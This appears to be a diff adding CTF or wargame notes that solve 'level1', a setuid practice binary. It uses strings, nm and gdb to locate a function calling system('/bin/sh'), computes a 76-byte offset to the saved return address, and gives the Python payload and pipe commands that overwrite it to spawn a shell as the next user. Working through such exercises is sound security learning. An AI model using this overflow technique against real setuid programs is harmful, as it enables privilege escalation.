@@ -1,0 +1,44 @@
+Always scp the binary to analyse it in Kali.
+
+RF> ls -l level1
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+
+#> strings level1 | less
+ [...]
+system
+ [...]
+/bin/sh
+ [...]
+
+#> nm --defined-only -nr level1 | grep " T "
+ [...]
+08048480 T main
+08048444 T run
+ [...]
+
+Using gdb's disas:
+main -> has local buffer
+     -> never calls run
+run  -> calls system("/bin/sh")
+
+GOAL: buffer overflow main's local buffer to set pushed EIP to run's address
+
+break after call to gets
+stack: x/24wx $esp
+esp + 0x00 : call arguments
+esp + 0x10 : buffer[64]
+esp + 0x50 : memory allignement
+esp + 0x58 : pushed EBP
+esp + 0x5c : pushed EIP -> GOAL
+
+TARGET: 0x08048444
+OFFSET: 0x5c - 0x10 = 0x4c = 76
+
+SCRIPT: print "A"*76+"\x44\x84\x04\x08"
+
+Prepare input:
+RF> python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/l1
+
+Send input and stdin enabling new shell to get input:
+RF> cat /tmp/l1 - | ./level1
+RF> (cat /tmp/l1 ; cat) | ./level1
